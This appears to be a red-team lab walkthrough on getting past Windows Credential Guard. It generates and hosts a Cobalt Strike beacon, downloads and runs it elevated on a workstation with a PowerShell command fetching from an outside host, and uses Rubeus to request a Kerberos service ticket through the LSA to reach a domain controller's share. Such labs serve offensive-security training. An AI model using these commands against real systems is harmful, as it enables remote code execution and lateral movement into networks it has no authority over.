    8. Credential Guard

    Generate and host payload

    1. Launch Cobalt Strike and connect to the Team Server.
    2. Generate a payload.
      1. Payloads > Windows Stageless Payload
      2. Listener: http
      3. Click Generate
      4. Save to C:\Payloads\beacon_x64.exe
    3. Host the payload.
      1. Site Management > Host File
      2. File: C:\Payloads\beacon_x64.exe
      3. Local URI: /beacon_x64.exe
      4. Click Launch
    4. Switch to @lab.VirtualMachine(lon-wkstn-1).SelectLink and login with @lab.VirtualMachine(lon-wkstn-1).Password.

    5. Download and execute the payload.

      iwr -Uri "http://www.bleepincomputer.com/beacon_x64.exe" -OutFile "C:\Users\pchilds\Downloads\beacon_x64.exe"
Start-Process -FilePath "C:\Users\pchilds\Downloads\beacon_x64.exe" -Verb RunAs

    6. Switch back to the @lab.VirtualMachine(attacker-desktop).SelectLink.

    Kerberos

    1. Interact with the Beacon and try to list the C$ drive on lon-dc-1.

      1. ls \\\\lon-dc-1\\c$

      [!hint] This should fail with an access denied error.

    2. Triage tickets on lon-wkstn-1.

      execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

      [!hint] You should see a TGT for Administrator.

    3. Request a service ticket for CIFS via the LSA.

      execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/lon-dc-1 /luid:[LUID] /ptt

    4. List the C$ share on lon-dc-1.

      1. ls \\\\lon-dc-1\\c$

    [!knowledge] Credential Guard prevents attackers dumping TGTs from memory. In this lab, you worked around this restriction by requesting a service ticket via the LSA instead.
